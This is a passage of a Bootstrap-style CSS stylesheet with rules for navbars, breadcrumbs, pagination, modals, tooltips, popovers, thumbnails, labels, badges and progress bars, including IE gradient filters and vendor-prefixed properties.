	-moz-border-radius: 0;
	border-radius: 0;
}
.navbar-static-top .container,
.navbar-fixed-top .container,
.navbar-fixed-bottom .container {
	width: 940px;
}
.navbar-fixed-top {
	top: 0;
}
.navbar-fixed-top .navbar-inner,
.navbar-static-top .navbar-inner {
	-webkit-box-shadow: 0 1px 10px rgba(0,0,0,.1);
	-moz-box-shadow: 0 1px 10px rgba(0,0,0,.1);
	box-shadow: 0 1px 10px rgba(0,0,0,.1);
}
.navbar-fixed-bottom {
	bottom: 0;
}
.navbar-fixed-bottom .navbar-inner {
	-webkit-box-shadow: 0 -1px 10px rgba(0,0,0,.1);
	-moz-box-shadow: 0 -1px 10px rgba(0,0,0,.1);
	box-shadow: 0 -1px 10px rgba(0,0,0,.1);
}
.navbar .nav {
	position: relative;
	left: 0;
	display: block;
	float: left;
	margin: 0 10px 0 0;
}
.navbar .nav.pull-right {
	float: right;
	margin-right: 0;
}
.navbar .nav > li {
	float: left;
}
.navbar .nav > li > a {
	float: none;
	padding: 11px 15px 11px;
	color: #555;
	text-decoration: none;
	text-shadow: 0 1px 0 #ffffff;
}
.navbar .nav .dropdown-toggle .caret {
	margin-top: 8px;
}
.navbar .nav > li > a:focus,
.navbar .nav > li > a:hover {
	background-color: transparent;
	color: #333;
	text-decoration: none;
}
.navbar .nav > li > a:focus {
	outline: 2px solid #5e9ed6;
}
.navbar .nav > .active > a,
.navbar .nav > .active > a:hover,
.navbar .nav > .active > a:focus {
	color: #555;
	text-decoration: none;
	background-color: #e6e6e6;
	-webkit-box-shadow: inset 0 3px 8px rgba(0,0,0,0.125);
	-moz-box-shadow: inset 0 3px 8px rgba(0,0,0,0.125);
	box-shadow: inset 0 3px 8px rgba(0,0,0,0.125);
}
.navbar .btn-navbar {
	display: none;
	float: right;
	padding: 7px 10px;
	margin-left: 5px;
	margin-right: 5px;
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #ededed;
	background-image: -moz-linear-gradient(top,#f2f2f2,#e6e6e6);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#f2f2f2),to(#e6e6e6));
	background-image: -webkit-linear-gradient(top,#f2f2f2,#e6e6e6);
	background-image: -o-linear-gradient(top,#f2f2f2,#e6e6e6);
	background-image: linear-gradient(to bottom,#f2f2f2,#e6e6e6);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2f2f2', endColorstr='#ffe5e5e5', GradientType=0);
	border-color: #e6e6e6 #e6e6e6 #bfbfbf;
	*background-color: #e6e6e6;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
	-webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.075);
	-moz-box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.075);
	box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.075);
}
.navbar .btn-navbar:hover,
.navbar .btn-navbar:focus,
.navbar .btn-navbar:active,
.navbar .btn-navbar.active,
.navbar .btn-navbar.disabled,
.navbar .btn-navbar[disabled] {
	color: #fff;
	background-color: #e6e6e6;
	*background-color: #d9d9d9;
}
.navbar .btn-navbar:active,
.navbar .btn-navbar.active {
	background-color: #cccccc \9;
}
.navbar .btn-navbar .icon-bar {
	display: block;
	width: 18px;
	height: 2px;
	background-color: #f5f5f5;
	-webkit-border-radius: 1px;
	-moz-border-radius: 1px;
	border-radius: 1px;
	-webkit-box-shadow: 0 1px 0 rgba(0,0,0,0.25);
	-moz-box-shadow: 0 1px 0 rgba(0,0,0,0.25);
	box-shadow: 0 1px 0 rgba(0,0,0,0.25);
}
.btn-navbar .icon-bar + .icon-bar {
	margin-top: 3px;
}
.navbar .nav > li > .dropdown-menu:before {
	content: '';
	display: inline-block;
	border-left: 7px solid transparent;
	border-right: 7px solid transparent;
	border-bottom: 7px solid #ccc;
	border-bottom-color: rgba(0,0,0,0.2);
	position: absolute;
	top: -7px;
	left: 9px;
}
.navbar .nav > li > .dropdown-menu:after {
	content: '';
	display: inline-block;
	border-left: 6px solid transparent;
	border-right: 6px solid transparent;
	border-bottom: 6px solid #fff;
	position: absolute;
	top: -6px;
	left: 10px;
}
.navbar-fixed-bottom .nav > li > .dropdown-menu:before {
	border-top: 7px solid #ccc;
	border-top-color: rgba(0,0,0,0.2);
	border-bottom: 0;
	bottom: -7px;
	top: auto;
}
.navbar-fixed-bottom .nav > li > .dropdown-menu:after {
	border-top: 6px solid #fff;
	border-bottom: 0;
	bottom: -6px;
	top: auto;
}
.navbar .nav li.dropdown > a:hover .caret,
.navbar .nav li.dropdown > a:focus .caret {
	border-top-color: #333;
	border-bottom-color: #333;
}
.navbar .nav li.dropdown.open > .dropdown-toggle,
.navbar .nav li.dropdown.active > .dropdown-toggle,
.navbar .nav li.dropdown.open.active > .dropdown-toggle {
	background-color: #e6e6e6;
	color: #555;
}
.navbar .nav li.dropdown > .dropdown-toggle .caret {
	border-top-color: #555;
	border-bottom-color: #555;
}
.navbar .nav li.dropdown.open > .dropdown-toggle .caret,
.navbar .nav li.dropdown.active > .dropdown-toggle .caret,
.navbar .nav li.dropdown.open.active > .dropdown-toggle .caret {
	border-top-color: #555;
	border-bottom-color: #555;
}
.navbar .pull-right > li > .dropdown-menu,
.navbar .nav > li > .dropdown-menu.pull-right {
	left: auto;
	right: 0;
}
.navbar .pull-right > li > .dropdown-menu:before,
.navbar .nav > li > .dropdown-menu.pull-right:before {
	left: auto;
	right: 12px;
}
.navbar .pull-right > li > .dropdown-menu:after,
.navbar .nav > li > .dropdown-menu.pull-right:after {
	left: auto;
	right: 13px;
}
.navbar .pull-right > li > .dropdown-menu .dropdown-menu,
.navbar .nav > li > .dropdown-menu.pull-right .dropdown-menu {
	left: auto;
	right: 100%;
	margin-left: 0;
	margin-right: -1px;
	-webkit-border-radius: 6px 0 6px 6px;
	-moz-border-radius: 6px 0 6px 6px;
	border-radius: 6px 0 6px 6px;
}
.navbar-inverse .navbar-inner {
	background-color: #13294a;
	background-image: -moz-linear-gradient(top,#152d53,#10223e);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#152d53),to(#10223e));
	background-image: -webkit-linear-gradient(top,#152d53,#10223e);
	background-image: -o-linear-gradient(top,#152d53,#10223e);
	background-image: linear-gradient(to bottom,#152d53,#10223e);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff142c52', endColorstr='#ff0f213e', GradientType=0);
	border-color: #0b172a;
}
.navbar-inverse .brand,
.navbar-inverse .nav > li > a {
	color: #d9d9d9;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
}
.navbar-inverse .brand:hover,
.navbar-inverse .brand:focus,
.navbar-inverse .nav > li > a:hover,
.navbar-inverse .nav > li > a:focus {
	color: #fff;
}
.navbar-inverse .brand {
	color: #d9d9d9;
}
.navbar-inverse .navbar-text {
	color: #d9d9d9;
}
.navbar-inverse .nav > li > a:focus,
.navbar-inverse .nav > li > a:hover {
	background-color: transparent;
	color: #fff;
}
.navbar-inverse .nav .active > a,
.navbar-inverse .nav .active > a:hover,
.navbar-inverse .nav .active > a:focus {
	color: #fff;
	background-color: #10223e;
}
.navbar-inverse .navbar-link {
	color: #d9d9d9;
}
.navbar-inverse .navbar-link:hover,
.navbar-inverse .navbar-link:focus {
	color: #fff;
}
.navbar-inverse .divider-vertical {
	border-left-color: #10223e;
	border-right-color: #152d53;
}
.navbar-inverse .nav li.dropdown.open > .dropdown-toggle,
.navbar-inverse .nav li.dropdown.active > .dropdown-toggle,
.navbar-inverse .nav li.dropdown.open.active > .dropdown-toggle {
	background-color: #10223e;
	color: #fff;
}
.navbar-inverse .nav li.dropdown > a:hover .caret,
.navbar-inverse .nav li.dropdown > a:focus .caret {
	border-top-color: #fff;
	border-bottom-color: #fff;
}
.navbar-inverse .nav li.dropdown > .dropdown-toggle .caret {
	border-top-color: #d9d9d9;
	border-bottom-color: #d9d9d9;
}
.navbar-inverse .nav li.dropdown.open > .dropdown-toggle .caret,
.navbar-inverse .nav li.dropdown.active > .dropdown-toggle .caret,
.navbar-inverse .nav li.dropdown.open.active > .dropdown-toggle .caret {
	border-top-color: #fff;
	border-bottom-color: #fff;
}
.navbar-inverse .navbar-search .search-query {
	color: #fff;
	background-color: #2959a4;
	border-color: #10223e;
	-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1), 0 1px 0 rgba(255,255,255,.15);
	-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,.1), 0 1px 0 rgba(255,255,255,.15);
	box-shadow: inset 0 1px 2px rgba(0,0,0,.1), 0 1px 0 rgba(255,255,255,.15);
	-webkit-transition: none;
	-moz-transition: none;
	-o-transition: none;
	transition: none;
}
.navbar-inverse .navbar-search .search-query:-moz-placeholder {
	color: #ccc;
}
.navbar-inverse .navbar-search .search-query:-ms-input-placeholder {
	color: #ccc;
}
.navbar-inverse .navbar-search .search-query::-webkit-input-placeholder {
	color: #ccc;
}
.navbar-inverse .navbar-search .search-query:focus,
.navbar-inverse .navbar-search .search-query.focused {
	padding: 5px 15px;
	color: #333;
	text-shadow: 0 1px 0 #fff;
	background-color: #fff;
	border: 0;
	-webkit-box-shadow: 0 0 3px rgba(0,0,0,0.15);
	-moz-box-shadow: 0 0 3px rgba(0,0,0,0.15);
	box-shadow: 0 0 3px rgba(0,0,0,0.15);
	outline: 0;
}
.navbar-inverse .btn-navbar {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #0e1d36;
	background-image: -moz-linear-gradient(top,#10223e,#0b172a);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#10223e),to(#0b172a));
	background-image: -webkit-linear-gradient(top,#10223e,#0b172a);
	background-image: -o-linear-gradient(top,#10223e,#0b172a);
	background-image: linear-gradient(to bottom,#10223e,#0b172a);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0f213e', endColorstr='#ff0a1629', GradientType=0);
	border-color: #0b172a #0b172a #000000;
	*background-color: #0b172a;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.navbar-inverse .btn-navbar:hover,
.navbar-inverse .btn-navbar:focus,
.navbar-inverse .btn-navbar:active,
.navbar-inverse .btn-navbar.active,
.navbar-inverse .btn-navbar.disabled,
.navbar-inverse .btn-navbar[disabled] {
	color: #fff;
	background-color: #0b172a;
	*background-color: #050c16;
}
.navbar-inverse .btn-navbar:active,
.navbar-inverse .btn-navbar.active {
	background-color: #000101 \9;
}
.breadcrumb {
	padding: 8px 15px;
	margin: 0 0 18px;
	list-style: none;
	background-color: #f5f5f5;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.breadcrumb > li {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	text-shadow: 0 1px 0 #fff;
}
.breadcrumb > li > .divider {
	padding: 0 5px;
	color: #ccc;
}
.breadcrumb > .active {
	color: #999;
}
.pagination {
	margin: 18px 0;
}
.pagination ul {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	margin-left: 0;
	margin-bottom: 0;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.05);
	-moz-box-shadow: 0 1px 2px rgba(0,0,0,0.05);
	box-shadow: 0 1px 2px rgba(0,0,0,0.05);
}
.pagination ul > li {
	display: inline;
}
.pagination ul > li > a,
.pagination ul > li > span {
	float: left;
	padding: 4px 12px;
	line-height: 18px;
	text-decoration: none;
	background-color: #fff;
	border: 1px solid #ddd;
	border-left-width: 0;
}
.pagination ul > li > a:hover,
.pagination ul > li > a:focus,
.pagination ul > .active > a,
.pagination ul > .active > span {
	background-color: #f5f5f5;
}
.pagination ul > .active > a,
.pagination ul > .active > span {
	color: #999;
	cursor: default;
}
.pagination ul > .disabled > span,
.pagination ul > .disabled > a,
.pagination ul > .disabled > a:hover,
.pagination ul > .disabled > a:focus {
	color: #999;
	background-color: transparent;
	cursor: default;
}
.pagination ul > li:first-child > a,
.pagination ul > li:first-child > span {
	border-left-width: 1px;
	-webkit-border-top-left-radius: 4px;
	-moz-border-radius-topleft: 4px;
	border-top-left-radius: 4px;
	-webkit-border-bottom-left-radius: 4px;
	-moz-border-radius-bottomleft: 4px;
	border-bottom-left-radius: 4px;
}
.pagination ul > li:last-child > a,
.pagination ul > li:last-child > span {
	-webkit-border-top-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	border-top-right-radius: 4px;
	-webkit-border-bottom-right-radius: 4px;
	-moz-border-radius-bottomright: 4px;
	border-bottom-right-radius: 4px;
}
.pagination-centered {
	text-align: center;
}
.pagination-right {
	text-align: right;
}
.pagination-large ul > li > a,
.pagination-large ul > li > span {
	padding: 11px 19px;
	font-size: 16.25px;
}
.pagination-large ul > li:first-child > a,
.pagination-large ul > li:first-child > span {
	-webkit-border-top-left-radius: 6px;
	-moz-border-radius-topleft: 6px;
	border-top-left-radius: 6px;
	-webkit-border-bottom-left-radius: 6px;
	-moz-border-radius-bottomleft: 6px;
	border-bottom-left-radius: 6px;
}
.pagination-large ul > li:last-child > a,
.pagination-large ul > li:last-child > span {
	-webkit-border-top-right-radius: 6px;
	-moz-border-radius-topright: 6px;
	border-top-right-radius: 6px;
	-webkit-border-bottom-right-radius: 6px;
	-moz-border-radius-bottomright: 6px;
	border-bottom-right-radius: 6px;
}
.pagination-mini ul > li:first-child > a,
.pagination-mini ul > li:first-child > span,
.pagination-small ul > li:first-child > a,
.pagination-small ul > li:first-child > span {
	-webkit-border-top-left-radius: 3px;
	-moz-border-radius-topleft: 3px;
	border-top-left-radius: 3px;
	-webkit-border-bottom-left-radius: 3px;
	-moz-border-radius-bottomleft: 3px;
	border-bottom-left-radius: 3px;
}
.pagination-mini ul > li:last-child > a,
.pagination-mini ul > li:last-child > span,
.pagination-small ul > li:last-child > a,
.pagination-small ul > li:last-child > span {
	-webkit-border-top-right-radius: 3px;
	-moz-border-radius-topright: 3px;
	border-top-right-radius: 3px;
	-webkit-border-bottom-right-radius: 3px;
	-moz-border-radius-bottomright: 3px;
	border-bottom-right-radius: 3px;
}
.pagination-small ul > li > a,
.pagination-small ul > li > span {
	padding: 2px 10px;
	font-size: 12px;
}
.pagination-mini ul > li > a,
.pagination-mini ul > li > span {
	padding: 0 6px;
	font-size: 9.75px;
}
.pager {
	margin: 18px 0;
	list-style: none;
	text-align: center;
	*zoom: 1;
}
.pager:before,
.pager:after {
	display: table;
	content: "";
	line-height: 0;
}
.pager:after {
	clear: both;
}
.pager li {
	display: inline;
}
.pager li > a,
.pager li > span {
	display: inline-block;
	padding: 5px 14px;
	background-color: #fff;
	border: 1px solid #ddd;
	-webkit-border-radius: 15px;
	-moz-border-radius: 15px;
	border-radius: 15px;
}
.pager li > a:hover,
.pager li > a:focus {
	text-decoration: none;
	background-color: #f5f5f5;
}
.pager .next > a,
.pager .next > span {
	float: right;
}
.pager .previous > a,
.pager .previous > span {
	float: left;
}
.pager .disabled > a,
.pager .disabled > a:hover,
.pager .disabled > a:focus,
.pager .disabled > span {
	color: #999;
	background-color: #fff;
	cursor: default;
}
.modal-backdrop {
	position: fixed;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	z-index: 1040;
	background-color: #000;
}
.modal-backdrop.fade {
	opacity: 0;
}
.modal-backdrop,
.modal-backdrop.fade.in {
	opacity: 0.8;
	filter: alpha(opacity=80);
}
.modal-header {
	padding: 9px 15px;
	border-bottom: 1px solid #eee;
}
.modal-header .close {
	margin-top: 2px;
}
.modal-header h3 {
	margin: 0;
	line-height: 30px;
}
.modal-body {
	width: 98%;
	position: relative;
	max-height: 400px;
	padding: 1%;
}
.modal-body iframe {
	width: 100%;
	max-height: none;
	border: 0 !important;
}
.modal-form {
	margin-bottom: 0;
}
.modal-footer {
	padding: 14px 15px 15px;
	margin-bottom: 0;
	text-align: right;
	background-color: #f5f5f5;
	border-top: 1px solid #ddd;
	-webkit-border-radius: 0 0 6px 6px;
	-moz-border-radius: 0 0 6px 6px;
	border-radius: 0 0 6px 6px;
	-webkit-box-shadow: inset 0 1px 0 #fff;
	-moz-box-shadow: inset 0 1px 0 #fff;
	box-shadow: inset 0 1px 0 #fff;
	*zoom: 1;
}
.modal-footer:before,
.modal-footer:after {
	display: table;
	content: "";
	line-height: 0;
}
.modal-footer:after {
	clear: both;
}
.modal-footer .btn + .btn {
	margin-left: 5px;
	margin-bottom: 0;
}
.modal-footer .btn-group .btn + .btn {
	margin-left: -1px;
}
.modal-footer .btn-block + .btn-block {
	margin-left: 0;
}
.tooltip {
	position: absolute;
	z-index: 1030;
	display: block;
	visibility: visible;
	font-size: 11px;
	line-height: 1.4;
	opacity: 0;
	filter: alpha(opacity=0);
}
.tooltip.in {
	opacity: 0.8;
	filter: alpha(opacity=80);
}
.tooltip.top {
	margin-top: -3px;
	padding: 5px 0;
}
.tooltip.right {
	margin-left: 3px;
	padding: 0 5px;
}
.tooltip.bottom {
	margin-top: 3px;
	padding: 5px 0;
}
.tooltip.left {
	margin-left: -3px;
	padding: 0 5px;
}
.tooltip-inner {
	max-width: 200px;
	padding: 8px;
	color: #fff;
	text-align: center;
	text-decoration: none;
	background-color: #000;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.tooltip-arrow {
	position: absolute;
	width: 0;
	height: 0;
	border-color: transparent;
	border-style: solid;
}
.tooltip.top .tooltip-arrow {
	bottom: 0;
	left: 50%;
	margin-left: -5px;
	border-width: 5px 5px 0;
	border-top-color: #000;
}
.tooltip.right .tooltip-arrow {
	top: 50%;
	left: 0;
	margin-top: -5px;
	border-width: 5px 5px 5px 0;
	border-right-color: #000;
}
.tooltip.left .tooltip-arrow {
	top: 50%;
	right: 0;
	margin-top: -5px;
	border-width: 5px 0 5px 5px;
	border-left-color: #000;
}
.tooltip.bottom .tooltip-arrow {
	top: 0;
	left: 50%;
	margin-left: -5px;
	border-width: 0 5px 5px;
	border-bottom-color: #000;
}
.popover {
	position: absolute;
	top: 0;
	left: 0;
	z-index: 1060;
	display: none;
	max-width: 276px;
	padding: 1px;
	text-align: left;
	background-color: #fff;
	-webkit-background-clip: padding-box;
	-moz-background-clip: padding;
	background-clip: padding-box;
	border: 1px solid #ccc;
	border: 1px solid rgba(0,0,0,0.2);
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
	-webkit-box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	-moz-box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	white-space: normal;
}
.popover.top {
	margin-top: -10px;
}
.popover.right {
	margin-left: 10px;
}
.popover.bottom {
	margin-top: 10px;
}
.popover.left {
	margin-left: -10px;
}
.popover-title {
	margin: 0;
	padding: 8px 14px;
	font-size: 14px;
	font-weight: normal;
	line-height: 18px;
	background-color: #f7f7f7;
	border-bottom: 1px solid #ebebeb;
	-webkit-border-radius: 5px 5px 0 0;
	-moz-border-radius: 5px 5px 0 0;
	border-radius: 5px 5px 0 0;
}
.popover-title:empty {
	display: none;
}
.popover-content {
	padding: 9px 14px;
}
.popover .arrow,
.popover .arrow:after {
	position: absolute;
	display: block;
	width: 0;
	height: 0;
	border-color: transparent;
	border-style: solid;
}
.popover .arrow {
	border-width: 11px;
}
.popover .arrow:after {
	border-width: 10px;
	content: "";
}
.popover.top .arrow {
	left: 50%;
	margin-left: -11px;
	border-bottom-width: 0;
	border-top-color: #999;
	border-top-color: rgba(0,0,0,0.25);
	bottom: -11px;
}
.popover.top .arrow:after {
	bottom: 1px;
	margin-left: -10px;
	border-bottom-width: 0;
	border-top-color: #fff;
}
.popover.right .arrow {
	top: 50%;
	left: -11px;
	margin-top: -11px;
	border-left-width: 0;
	border-right-color: #999;
	border-right-color: rgba(0,0,0,0.25);
}
.popover.right .arrow:after {
	left: 1px;
	bottom: -10px;
	border-left-width: 0;
	border-right-color: #fff;
}
.popover.bottom .arrow {
	left: 50%;
	margin-left: -11px;
	border-top-width: 0;
	border-bottom-color: #999;
	border-bottom-color: rgba(0,0,0,0.25);
	top: -11px;
}
.popover.bottom .arrow:after {
	top: 1px;
	margin-left: -10px;
	border-top-width: 0;
	border-bottom-color: #fff;
}
.popover.left .arrow {
	top: 50%;
	right: -11px;
	margin-top: -11px;
	border-right-width: 0;
	border-left-color: #999;
	border-left-color: rgba(0,0,0,0.25);
}
.popover.left .arrow:after {
	right: 1px;
	border-right-width: 0;
	border-left-color: #fff;
	bottom: -10px;
}
.thumbnails {
	margin-left: -20px;
	list-style: none;
	*zoom: 1;
}
.thumbnails:before,
.thumbnails:after {
	display: table;
	content: "";
	line-height: 0;
}
.thumbnails:after {
	clear: both;
}
.row-fluid .thumbnails {
	margin-left: 0;
}
.thumbnails > li {
	float: left;
	margin-bottom: 18px;
	margin-left: 20px;
}
.thumbnail {
	display: block;
	padding: 4px;
	line-height: 18px;
	border: 1px solid #ddd;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.055);
	-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.055);
	box-shadow: 0 1px 3px rgba(0,0,0,0.055);
	-webkit-transition: all .2s ease-in-out;
	-moz-transition: all .2s ease-in-out;
	-o-transition: all .2s ease-in-out;
	transition: all .2s ease-in-out;
}
a.thumbnail:hover,
a.thumbnail:focus {
	border-color: #3071a9;
	-webkit-box-shadow: 0 1px 4px rgba(0,105,214,0.25);
	-moz-box-shadow: 0 1px 4px rgba(0,105,214,0.25);
	box-shadow: 0 1px 4px rgba(0,105,214,0.25);
}
.thumbnail > img {
	display: block;
	max-width: 100%;
	margin-left: auto;
	margin-right: auto;
}
.thumbnail .caption {
	padding: 9px;
	color: #555;
}
.media,
.media-body {
	overflow: hidden;
	*overflow: visible;
	zoom: 1;
}
.media,
.media .media {
	margin-top: 15px;
}
.media:first-child {
	margin-top: 0;
}
.media-object {
	display: block;
}
.media-heading {
	margin: 0 0 5px;
}
.media > .pull-left {
	margin-right: 10px;
}
.media > .pull-right {
	margin-left: 10px;
}
.media-list {
	margin-left: 0;
	list-style: none;
}
.label,
.badge {
	display: inline-block;
	padding: 2px 4px;
	font-size: 10.998px;
	font-weight: bold;
	line-height: 14px;
	color: #fff;
	vertical-align: baseline;
	white-space: nowrap;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #999;
}
.label {
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
.badge {
	padding-left: 9px;
	padding-right: 9px;
	-webkit-border-radius: 9px;
	-moz-border-radius: 9px;
	border-radius: 9px;
}
.label:empty,
.badge:empty {
	display: none;
}
a.label:hover,
a.label:focus,
a.badge:hover,
a.badge:focus {
	color: #fff;
	text-decoration: none;
	cursor: pointer;
}
.label-important,
.badge-important {
	background-color: #a94442;
}
.label-important[href],
.badge-important[href] {
	background-color: #843534;
}
.label-warning,
.badge-warning {
	background-color: #f89406;
}
.label-warning[href],
.badge-warning[href] {
	background-color: #c67605;
}
.label-success,
.badge-success {
	background-color: #3c763d;
}
.label-success[href],
.badge-success[href] {
	background-color: #2b542c;
}
.label-info,
.badge-info {
	background-color: #31708f;
}
.label-info[href],
.badge-info[href] {
	background-color: #245269;
}
.label-inverse,
.badge-inverse {
	background-color: #333;
}
.label-inverse[href],
.badge-inverse[href] {
	background-color: #1a1a1a;
}
.btn .label,
.btn .badge {
	position: relative;
	top: -1px;
}
.btn-mini .label,
.btn-mini .badge {
	top: 0;
}
@-webkit-keyframes progress-bar-stripes {
	from {
		background-position: 40px 0;
	}
	to {
		background-position: 0 0;
	}
}
@-moz-keyframes progress-bar-stripes {
	from {
		background-position: 40px 0;
	}
	to {
		background-position: 0 0;
	}
}
@-ms-keyframes progress-bar-stripes {
	from {
		background-position: 40px 0;
	}
	to {
		background-position: 0 0;
	}
}
@-o-keyframes progress-bar-stripes {
	from {
		background-position: 0 0;
	}
	to {
		background-position: 40px 0;
	}
}
@keyframes progress-bar-stripes {
	from {
		background-position: 40px 0;
	}
	to {
		background-position: 0 0;
	}
}
.progress {
	overflow: hidden;
	height: 18px;
	margin-bottom: 18px;
	background-color: #f7f7f7;
	background-image: -moz-linear-gradient(top,#f5f5f5,#f9f9f9);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#f5f5f5),to(#f9f9f9));
	background-image: -webkit-linear-gradient(top,#f5f5f5,#f9f9f9);
	background-image: -o-linear-gradient(top,#f5f5f5,#f9f9f9);
	background-image: linear-gradient(to bottom,#f5f5f5,#f9f9f9);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#fff9f9f9', GradientType=0);
	-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
	-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
	box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.progress .bar {
	width: 0%;
	height: 100%;
	color: #fff;
	float: left;
	font-size: 12px;
	text-align: center;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #0e90d2;
	background-image: -moz-linear-gradient(top,#149bdf,#0480be);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#149bdf),to(#0480be));
	background-image: -webkit-linear-gradient(top,#149bdf,#0480be);
	background-image: -o-linear-gradient(top,#149bdf,#0480be);
	background-image: linear-gradient(to bottom,#149bdf,#0480be);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff149bdf', endColorstr='#ff0480be', GradientType=0);
	-webkit-box-shadow: inset 0 -1px 0 rgba(0,0,0,0.15);
	-moz-box-shadow: inset 0 -1px 0 rgba(0,0,0,0.15);
	box-shadow: inset 0 -1px 0 rgba(0,0,0,0.15);
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	-webkit-transition: width .6s ease;
	-moz-transition: width .6s ease;
	-o-transition: width .6s ease;
	transition: width .6s ease;
}
.progress .bar + .bar {
	-webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.15), inset 0 -1px 0 rgba(0,0,0,.15);
	-moz-box-shadow: inset 1px 0 0 rgba(0,0,0,.15), inset 0 -1px 0 rgba(0,0,0,.15);
	box-shadow: inset 1px 0 0 rgba(0,0,0,.15), inset 0 -1px 0 rgba(0,0,0,.15);
}
.progress-striped .bar {
	background-color: #149bdf;
	background-image: -webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,0.15)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,0.15)),color-stop(.75,rgba(255,255,255,0.15)),color-stop(.75,transparent),to(transparent));
	background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -moz-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	-webkit-background-size: 40px 40px;
	-moz-background-size: 40px 40px;
	-o-background-size: 40px 40px;
	background-size: 40px 40px;
}
.progress.active .bar {
	-webkit-animation: progress-bar-stripes 2s linear infinite;
	-moz-animation: progress-bar-stripes 2s linear infinite;
	-ms-animation: progress-bar-stripes 2s linear infinite;
	-o-animation: progress-bar-stripes 2s linear infinite;
	animation: progress-bar-stripes 2s linear infinite;
}
.progress-danger .bar,
.progress .bar-danger {
	background-color: #dd514c;
	background-image: -moz-linear-gradient(top,#ee5f5b,#c43c35);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#ee5f5b),to(#c43c35));
	background-image: -webkit-linear-gradient(top,#ee5f5b,#c43c35);
	background-image: -o-linear-gradient(top,#ee5f5b,#c43c35);
	background-image: linear-gradient(to bottom,#ee5f5b,#c43c35);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffee5f5b', endColorstr='#ffc43c35', GradientType=0);
}
.progress-danger.progress-striped .bar,
.progress-striped .bar-danger {
	background-color: #ee5f5b;
	background-image: -webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,0.15)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,0.15)),color-stop(.75,rgba(255,255,255,0.15)),color-stop(.75,transparent),to(transparent));
	background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -moz-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
